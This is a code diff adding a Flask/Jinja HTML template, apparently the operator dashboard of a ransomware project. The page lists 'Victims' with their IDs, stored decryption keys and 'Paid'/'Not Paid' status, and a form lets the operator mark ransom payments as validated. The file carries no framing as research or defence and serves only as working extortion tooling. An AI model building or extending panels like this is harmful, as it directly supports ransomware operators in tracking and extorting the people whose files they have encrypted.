@@ -1,0 +1,52 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Victims</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
+    <script>
+        function togglePaymentStatus(element) {
+            if (element.checked) {
+                element.value = "1";
+            } else {
+                element.value = "0";
+            }
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>Victims</h1>
+        <form method="post">
+            <table border="1">
+                <thead>
+                    <tr>
+                        <th>ID</th>
+                        <th>Key</th>
+                        <th>Payment Status</th>
+                        <th>Action</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for victim in victims %}
+                    <tr>
+                        <td>{{ victim.id }}</td>
+                        <td title="{{ victim.key }}">{{ victim.key[:25] }}{% if victim.key|length > 25 %}...{% endif %}</td>
+                        <td>{{ "Paid" if victim.payment_status else "Not Paid" }}</td>
+                        <td>
+                            <label>
+                                <input type="hidden" name="victim_ids" value="{{ victim.id }}">
+                                <input type="checkbox" name="payment_status_{{ victim.id }}" value="{{ 1 if victim.payment_status else 0 }}" onchange="togglePaymentStatus(this)" {% if victim.payment_status %} checked {% endif %}>
+                                Validate Payment
+                            </label>
+                        </td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+            <button type="submit">Update Payment Status</button>
+        </form>
+    </div>
+</body>
+</html>
